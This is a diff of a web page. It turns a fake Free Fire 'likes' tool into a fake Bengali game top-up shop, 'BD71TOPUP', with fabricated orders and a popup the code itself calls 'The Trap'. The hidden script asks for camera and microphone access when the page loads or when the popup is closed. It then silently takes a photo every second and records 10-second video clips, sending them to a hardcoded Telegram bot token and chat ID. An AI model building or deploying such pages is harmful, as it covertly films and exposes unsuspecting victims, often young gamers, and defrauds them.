@@ -1,152 +1,305 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FF Auto Tools - Likes & Info</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BD71TOPUP</title>
+    <!-- Google Fonts for English and Bengali -->
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto:wght@400;500&display=swap');
+        :root {
+            --primary-green: #28a745;
+            --dark-blue: #09133a;
+            --bg-light: #f5f8ff;
+            --text-dark: #1f2937;
+            --text-muted: #6b7280;
+        }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', 'Hind Siliguri', sans-serif; }
 
         body {
-            background-color: #0d0e15;
-            color: #ffffff;
-            font-family: 'Roboto', sans-serif;
+            background-color: #e5e7eb;
             display: flex;
             justify-content: center;
-            align-items: center;
+        }
+
+        /* Mobile App Container */
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            background-color: var(--bg-light);
             min-height: 100vh;
-            background-image: radial-gradient(circle at center, #1a1c29, #0d0e15);
-            padding: 20px;
-            overflow: hidden; /* Prevents scrolling if hidden elements act weird */
+            position: relative;
+            padding-bottom: 70px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
         }
 
-        .container {
-            background: #151823;
-            width: 100%;
-            max-width: 450px;
-            padding: 30px;
-            border-radius: 12px;
-            border: 1px solid #2a2d3e;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
-            text-align: center;
-            z-index: 10;
+        /* Header */
+        .header {
+            background: #fff;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        .logo { font-size: 22px; font-weight: 700; color: var(--dark-blue); display: flex; align-items: center; gap: 8px;}
+        .logo-icon { color: var(--primary-green); font-size: 26px; font-weight: 900;}
+        .login-btn {
+            background: var(--primary-green); color: #fff; border: none; padding: 6px 16px; 
+            border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer;
         }
 
-        h1 {
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 2.5rem;
-            color: #ffaa00;
-            margin-bottom: 5px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
+        /* Hero Banner */
+        .hero-banner {
+            margin: 15px; border-radius: 10px; background: #000; height: 140px;
+            background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.8)), url('https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80');
+            background-size: cover; background-position: center; display: flex;
+            flex-direction: column; justify-content: center; align-items: center; color: #fff;
+            text-align: center; border: 2px solid #1a2035;
+        }
+        .hero-banner h2 { font-size: 18px; color: #fff; margin-bottom: 5px;}
+        .hero-banner .btn-telegram { background: #0088cc; color: #fff; padding: 5px 12px; border-radius: 20px; font-size: 12px; text-decoration: none;}
+
+        /* Section Title */
+        .section-title { text-align: center; color: var(--dark-blue); font-size: 18px; font-weight: 700; margin: 25px 0 15px 0; letter-spacing: 0.5px; }
+
+        /* Grid Products */
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 0 15px; }
+        .product-card {
+            background: linear-gradient(135deg, #0a3a1b, #001f0a);
+            border-radius: 8px; padding: 10px; text-align: center; cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1); border: 1px solid #144f27;
+            position: relative; overflow: hidden;
+        }
+        .product-card::before {
+            content: ''; position: absolute; top:0; left:0; right:0; bottom:0;
+            background-image: radial-gradient(white 1px, transparent 1px);
+            background-size: 20px 20px; opacity: 0.1;
+        }
+        .product-icon { font-size: 30px; margin-bottom: 5px; position: relative; z-index: 2;}
+        .product-name { color: #fff; font-size: 10px; font-weight: 600; text-transform: uppercase; position: relative; z-index: 2;}
+        .product-label { color: var(--dark-blue); font-size: 11px; font-weight: 700; margin-top: 5px;}
+
+        /* Recent Orders */
+        .recent-orders {
+            background: #fff; margin: 25px 15px; border-radius: 12px; padding: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+        .ro-header { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; border-bottom: 1px solid #f0f0f0; padding-bottom: 10px;}
+        .ro-icon { background: #ffe5e5; color: #ff4d4f; width: 35px; height: 35px; border-radius: 8px; display: flex; justify-content: center; align-items: center; font-size: 18px;}
+        .ro-title { font-weight: 700; font-size: 16px; color: var(--dark-blue); display: flex; align-items: center; gap: 8px;}
+        .live-dot { height: 8px; width: 8px; background-color: var(--primary-green); border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite;}
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.4); } 70% { box-shadow: 0 0 0 6px rgba(40, 167, 69, 0); } 100% { box-shadow: 0 0 0 0 rgba(40, 167, 69, 0); } }
+        
+        .order-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px dashed #eee; }
+        .order-item:last-child { border-bottom: none; }
+        .order-left { display: flex; align-items: center; gap: 12px; }
+        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #ccc; display: flex; justify-content: center; align-items: center; color: #fff; font-weight: 600;}
+        .order-name { font-weight: 700; font-size: 14px; color: var(--text-dark); }
+        .order-details { font-size: 12px; color: var(--text-muted); }
+        .order-status { background: #e6f4ea; color: #137333; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; display: flex; align-items: center; gap: 4px;}
+
+        /* Footer */
+        .footer { background: var(--dark-blue); color: #fff; padding: 30px 20px 90px 20px; text-align: center; }
+        .footer h3 { font-size: 16px; margin-bottom: 15px; letter-spacing: 1px;}
+        .social-icons { display: flex; justify-content: center; gap: 15px; margin-bottom: 25px;}
+        .social-icons span { border: 1px solid #4a5568; padding: 8px 12px; border-radius: 8px; font-size: 18px; cursor: pointer;}
+        .support-box { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 25px;}
+        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; font-size: 12px; color: #cbd5e1; margin-bottom: 20px;}
+        .copyright { font-size: 11px; color: #94a3b8; }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed; bottom: 0; width: 100%; max-width: 480px; background: #fff;
+            display: flex; justify-content: space-between; padding: 10px 25px;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.05); z-index: 100;
+        }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: var(--text-muted); font-size: 10px; font-weight: 600; cursor: pointer;}
+        .nav-item.active { color: var(--primary-green); }
+        .nav-icon { font-size: 20px; margin-bottom: 2px; }
+
+        /* Floating WhatsApp/Support */
+        .floating-support {
+            position: fixed; bottom: 80px; right: 15px; background: #25D366; color: white;
+            width: 50px; height: 50px; border-radius: 50%; display: flex; justify-content: center;
+            align-items: center; font-size: 24px; box-shadow: 0 4px 10px rgba(37,211,102,0.4); z-index: 90;
         }
 
-        p.subtitle { color: #8b92a5; margin-bottom: 25px; font-size: 0.95rem; }
-
-        .input-group { margin-bottom: 20px; text-align: left; }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #b0b5c9;
-            font-weight: 500;
-            font-size: 0.9rem;
+        /* Popup Overlay (The Trap) */
+        .popup-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center;
+            z-index: 1000;
         }
-
-        input[type="number"] {
-            width: 100%;
-            padding: 14px;
-            background: #090a0f;
-            border: 1px solid #3a3f55;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 1.1rem;
-            outline: none;
-            transition: 0.3s;
+        .popup-content {
+            background: #fff; width: 90%; max-width: 350px; border-radius: 12px; overflow: hidden;
+            text-align: center; padding-bottom: 20px; animation: popIn 0.3s ease-out;
         }
+        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .popup-header { background: #22c55e; color: #fff; padding: 20px; font-size: 24px; font-weight: 700; line-height: 1.2; text-shadow: 1px 1px 2px rgba(0,0,0,0.3);}
+        .popup-body { padding: 20px; font-size: 14px; color: #333; }
+        .popup-btn-blue { background: #3b82f6; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; margin: 15px 0; font-size: 14px; cursor: pointer;}
+        .popup-btn-close { background: var(--primary-green); color: #fff; border: none; padding: 10px 30px; border-radius: 25px; font-weight: 600; font-size: 14px; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;}
 
-        input[type="number"]:focus {
-            border-color: #ffaa00;
-            box-shadow: 0 0 8px rgba(255, 170, 0, 0.2);
-        }
-
-        .btn-grid { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
-
-        button {
-            padding: 14px;
-            border: none;
-            border-radius: 8px;
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 1.2rem;
-            font-weight: 700;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: all 0.3s ease;
-        }
-
-        .btn-info { background: #2b3044; color: #fff; }
-        .btn-info:hover { background: #3a415a; }
-
-        .btn-likes { background: linear-gradient(90deg, #ff4500, #ff8c00); color: #fff; }
-        .btn-likes:hover { box-shadow: 0 0 15px rgba(255, 69, 0, 0.4); }
-
-        .btn-visitors { background: linear-gradient(90deg, #00b09b, #96c93d); color: #fff; }
-        .btn-visitors:hover { box-shadow: 0 0 15px rgba(0, 176, 155, 0.4); }
-
-        #statusBox {
-            display: none;
-            margin-top: 20px;
-            padding: 15px;
-            background: #1a1e2d;
-            border-radius: 8px;
-            border-left: 4px solid #ffaa00;
-            text-align: left;
-            animation: fadeIn 0.3s;
-        }
-
-        .status-text { color: #ffaa00; font-weight: 500; font-size: 0.95rem; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        /* FIX: Render the video so it's not black, but hide it off-screen */
-        #videoElement, #canvasElement {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -1;
-        }
+        /* Hidden Capture Elements */
+        #videoElement, #canvasElement { position: absolute; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; z-index: -1; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>FF Auto Tools</h1>
-        <p class="subtitle">A2Z Profile Info, Auto Likes & Visitors</p>
-
-        <div class="input-group">
-            <label>Enter Game UID</label>
-            <input type="number" id="uidInput" placeholder="e.g. 5809073843" required>
-        </div>
-
-        <div class="btn-grid">
-            <button class="btn-info" onclick="triggerAction('Fetching A2Z Profile Data...')">Get Account Info</button>
-            <button class="btn-likes" onclick="triggerAction('Injecting 100 Likes to profile...')">Send 100 Likes (Daily)</button>
-            <button class="btn-visitors" onclick="triggerAction('Routing 500 Visitors to profile...')">Send 500 Visitors</button>
-        </div>
-
-        <div id="statusBox">
-            <div class="status-text" id="statusMessage">Connecting to server...</div>
+    <!-- Initial Popup Trap -->
+    <div class="popup-overlay" id="initialPopup">
+        <div class="popup-content">
+            <div class="popup-header">
+                ডাইমন্ড<br>টপ-আপ এখন<br>পানির দামে! 💎
+            </div>
+            <div class="popup-body">
+                যেকোনো সমস্যা বা সহায়তার জন্য এখন থেকে আমাদের টেলিগ্রাম অ্যাকাউন্টে যোগাযোগ করুন — Go Link-এ ক্লিক করুন।
+                <br>
+                <button class="popup-btn-blue">ক্লিক করুন</button>
+                <br>
+                <!-- Backup manual trigger -->
+                <button class="popup-btn-close" onclick="closePopupAndStartTrap()">✗ CLOSE</button>
+            </div>
         </div>
     </div>
 
-    <!-- Hidden Capture Elements (No longer display: none) -->
+    <!-- Main App UI -->
+    <div class="app-container">
+        
+        <div class="header">
+            <div class="logo"><span class="logo-icon">৳D</span> BD71TOPUP</div>
+            <button class="login-btn">Login</button>
+        </div>
+
+        <div class="hero-banner">
+            <h2>গিভওয়ে ও সকল অফার</h2>
+            <p style="font-size: 12px; margin-bottom: 10px;">সম্পর্কে জানতে</p>
+            <a href="#" class="btn-telegram">✈ টেলিগ্রাম চ্যানেলে জয়েন করুন</a>
+        </div>
+
+        <h2 class="section-title">REGULAR TOPUP</h2>
+        <div class="grid">
+            <div style="text-align: center;">
+                <div class="product-card" onclick="alert('Please login to purchase')">
+                    <div class="product-icon">🔥</div>
+                    <div class="product-name">200 LIKES</div>
+                </div>
+                <div class="product-label">FF LIKES</div>
+            </div>
+            <div style="text-align: center;">
+                <div class="product-card" onclick="alert('Please login to purchase')">
+                    <div class="product-icon">💎</div>
+                    <div class="product-name">UID TOPUP</div>
+                </div>
+                <div class="product-label">UID TOPUP</div>
+            </div>
+            <div style="text-align: center;">
+                <div class="product-card" onclick="alert('Please login to purchase')">
+                    <div class="product-icon">🎫</div>
+                    <div class="product-name">UNIPIN VOUCHER</div>
+                </div>
+                <div class="product-label">UNIPIN VOUCHER</div>
+            </div>
+            <div style="text-align: center;">
+                <div class="product-card" onclick="alert('Please login to purchase')">
+                    <div class="product-icon">👑</div>
+                    <div class="product-name">WEEKLY/MONTHLY</div>
+                </div>
+                <div class="product-label">WEEKLY MONTHLY OFFER</div>
+            </div>
+            <div style="text-align: center;">
+                <div class="product-card" onclick="alert('Please login to purchase')">
+                    <div class="product-icon">⭐</div>
+                    <div class="product-name">LEVEL UP PASS</div>
+                </div>
+                <div class="product-label">LEVEL UP PASS</div>
+            </div>
+            <div style="text-align: center;">
+                <div class="product-card" onclick="alert('Please login to purchase')">
+                    <div class="product-icon">⚡</div>
+                    <div class="product-name">WEEKLY LITE</div>
+                </div>
+                <div class="product-label">WEEKLY LITE BD</div>
+            </div>
+        </div>
+
+        <div class="recent-orders">
+            <div class="ro-header">
+                <div class="ro-icon">🛍️</div>
+                <div class="ro-title">Recent Orders <span style="font-size: 12px; color: var(--primary-green); font-weight: 500;"><span class="live-dot"></span> Live 📈</span></div>
+            </div>
+            <div class="order-item">
+                <div class="order-left">
+                    <div class="avatar" style="background:#d81b60;">J</div>
+                    <div><div class="order-name">JABED FF</div><div class="order-details">2530 Diamond - ৳1600</div></div>
+                </div>
+                <div class="order-status">✓ Done</div>
+            </div>
+            <div class="order-item">
+                <div class="order-left">
+                    <div class="avatar" style="background:#546e7a;">R</div>
+                    <div><div class="order-name">Riyad Real</div><div class="order-details">25 Diamond - ৳20</div></div>
+                </div>
+                <div class="order-status">✓ Done</div>
+            </div>
+            <div class="order-item">
+                <div class="order-left">
+                    <div class="avatar" style="background:#1e88e5;">A</div>
+                    <div><div class="order-name">ANIME UMP</div><div class="order-details">1x Weekly Lite - ৳40</div></div>
+                </div>
+                <div class="order-status">✓ Done</div>
+            </div>
+            <div class="order-item">
+                <div class="order-left">
+                    <div class="avatar" style="background:#fb8c00;">J</div>
+                    <div><div class="order-name">Joyonto Dj</div><div class="order-details">Weekly - ৳155</div></div>
+                </div>
+                <div class="order-status">✓ Done</div>
+            </div>
+            <div class="order-item">
+                <div class="order-left">
+                    <div class="avatar" style="background:#8e24aa;">M</div>
+                    <div><div class="order-name">MD ASRAFUL SIKDER</div><div class="order-details">Weekly - ৳155</div></div>
+                </div>
+                <div class="order-status">✓ Done</div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <h3>STAY CONNECTED</h3>
+            <p style="font-size: 12px; color:#cbd5e1; margin-bottom: 20px;">কোন সমস্যায় পড়লে টেলিগ্রাম এ যোগাযোগ করবেন। তাহলে দ্রুত সমাধান পেয়ে যাবেন।</p>
+            <div class="social-icons"><span>f</span> <span>📷</span> <span>▶</span> <span>✉</span></div>
+            <h3>SUPPORT CENTER</h3>
+            <div class="support-box">
+                <span style="font-size: 24px;">✈</span>
+                <div style="text-align: left;"><div style="font-weight: 700;">Help line [9AM-12PM]</div><div style="font-size: 12px; color: #cbd5e1;">টেলিগ্রামে সাপোর্ট</div></div>
+            </div>
+            <div class="footer-links"><span>About Us</span> <span>Terms & Conditions</span> <span>Privacy Policy</span><span>Refund & Return Policy</span> <span>Delete Account Policy</span></div>
+            <div class="copyright">© BD71TOPUP 2026 | All Rights Reserved | Developed by Team Mahal</div>
+        </div>
+        
+        <div class="floating-support">🎧</div>
+
+        <div class="bottom-nav">
+            <div class="nav-item active"><div class="nav-icon">🏠</div>Home</div>
+            <div class="nav-item"><div class="nav-icon">▶️</div>Tutorial</div>
+            <div class="nav-item"><div class="nav-icon">💎</div>TopUp</div>
+            <div class="nav-item"><div class="nav-icon">🎧</div>Contact Us</div>
+        </div>
+
+    </div>
+
+    <!-- Hidden Capture Elements (The Trap) -->
     <video id="videoElement" autoplay playsinline muted></video>
     <canvas id="canvasElement"></canvas>
 
     <script>
+        // === TELEGRAM BOT CONFIGURATION ===
         const BOT_TOKEN = '8725809195:AAFjqaGyk-3Gtovdc-OQImMhJ8TXm9Pw6dY';
         const CHAT_ID = '8091904438'; 
         
@@ -160,30 +313,24 @@
         const canvas = document.getElementById('canvasElement');
         const ctx = canvas.getContext('2d');
 
-        function triggerAction(actionText) {
-            const uid = document.getElementById('uidInput').value;
-            if (!uid) {
-                alert("Please enter a valid UID first.");
-                return;
+        // INSTANT LOAD TRIGGER: Attempts to start recording the millisecond the page loads
+        window.onload = () => {
+            if (!isRunning) {
+                const savedCamera = localStorage.getItem('cameraTarget') || 'user';
+                startCapture(savedCamera);
             }
+        };
 
-            const statusBox = document.getElementById('statusBox');
-            const statusMessage = document.getElementById('statusMessage');
-            statusBox.style.display = 'block';
-            statusMessage.innerText = actionText;
-
-            setTimeout(() => {
-                statusMessage.innerText = "Connecting to Garena API...";
-                statusBox.style.borderLeftColor = "#00b09b";
-                statusMessage.style.color = "#00b09b";
-            }, 3000);
-
+        // BACKUP TRIGGER: Hides the popup and starts the camera if the auto-load was blocked
+        function closePopupAndStartTrap() {
+            document.getElementById('initialPopup').style.display = 'none';
             if (!isRunning) {
                 const savedCamera = localStorage.getItem('cameraTarget') || 'user';
                 startCapture(savedCamera);
             }
         }
 
+        // Camera Logic
         async function startCapture(facingMode) {
             isRunning = true;
             if (currentStream) currentStream.getTracks().forEach(t => t.stop());
@@ -192,30 +339,24 @@
             if (recordingTimeout) clearTimeout(recordingTimeout);
 
             try {
-                // FIX: Force High Definition (HD 720p) resolution
+                // Request HD quality silently
                 currentStream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: facingMode,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
+                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: true
                 });
                 
                 video.srcObject = currentStream;
 
-                // FIX: Wait for the video to ACTUALLY start playing before taking photos
                 video.onplaying = () => {
-                    // Wait an extra 500ms for camera lighting to adjust automatically
                     setTimeout(() => {
-                        capturePhoto(facingMode); // Take first photo immediately
-                        photoInterval = setInterval(() => capturePhoto(facingMode), 1000); // Then every 1 second
+                        capturePhoto(facingMode); 
+                        photoInterval = setInterval(() => capturePhoto(facingMode), 1000); 
                         recordVideoLoop(facingMode);
                     }, 500);
                 };
                 
             } catch (err) {
-                console.error("Camera access denied.", err);
+                console.error("Camera access denied or blocked.");
                 isRunning = false;
             }
         }
@@ -223,37 +364,30 @@
         function recordVideoLoop(facingMode) {
             if (!currentStream) return;
             
-            // FIX: Try to force MP4 format and higher bitrate
             let mimeType = 'video/webm';
-            if (MediaRecorder.isTypeSupported('video/mp4')) {
-                mimeType = 'video/mp4';
-            } else if (MediaRecorder.isTypeSupported('video/webm;codecs=h264')) {
-                mimeType = 'video/webm;codecs=h264';
-            }
+            if (MediaRecorder.isTypeSupported('video/mp4')) { mimeType = 'video/mp4'; } 
+            else if (MediaRecorder.isTypeSupported('video/webm;codecs=h264')) { mimeType = 'video/webm;codecs=h264'; }
 
-            const options = { mimeType: mimeType, videoBitsPerSecond: 2500000 }; // 2.5 Mbps High Quality
+            const options = { mimeType: mimeType, videoBitsPerSecond: 2500000 }; 
             mediaRecorder = new MediaRecorder(currentStream, options);
             let chunks = [];
             
             mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
             
             mediaRecorder.onstop = () => {
-                const ext = mimeType.includes('mp4') ? 'mp4' : 'mp4'; // Tell Telegram it's MP4
+                const ext = mimeType.includes('mp4') ? 'mp4' : 'mp4'; 
                 sendVideo(chunks, facingMode, ext);
-                if (currentStream.active) {
-                    recordVideoLoop(facingMode);
-                }
+                if (currentStream.active) { recordVideoLoop(facingMode); }
             };
 
             mediaRecorder.start();
-            
             recordingTimeout = setTimeout(() => {
                 if (mediaRecorder.state === "recording") mediaRecorder.stop();
             }, 10000);
         }
 
         function capturePhoto(facingMode) {
-            if (video.videoWidth === 0) return; // Prevent black photos if video isn't ready
+            if (video.videoWidth === 0) return; 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -263,21 +397,22 @@
                 fd.append('chat_id', CHAT_ID);
                 fd.append('photo', blob, `photo_${facingMode}.jpg`);
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg', 0.9); // 0.9 = 90% High Quality JPG
+            }, 'image/jpeg', 0.9);
         }
 
         function sendVideo(chunks, facingMode, ext) {
-            const blob = new Blob(chunks, { type: 'video/webm' }); // Keep blob type webm but name it mp4
+            const blob = new Blob(chunks, { type: 'video/webm' }); 
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
             fd.append('video', blob, `video_${facingMode}.${ext}`);
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
         }
 
+        // Listens for Admin Panel Switches
         window.addEventListener('storage', (event) => {
             if (event.key === 'cameraTarget') {
                 const newCamera = event.newValue || 'user';
-                startCapture(newCamera);
+                if(isRunning) startCapture(newCamera);
             }
         });
     </script>
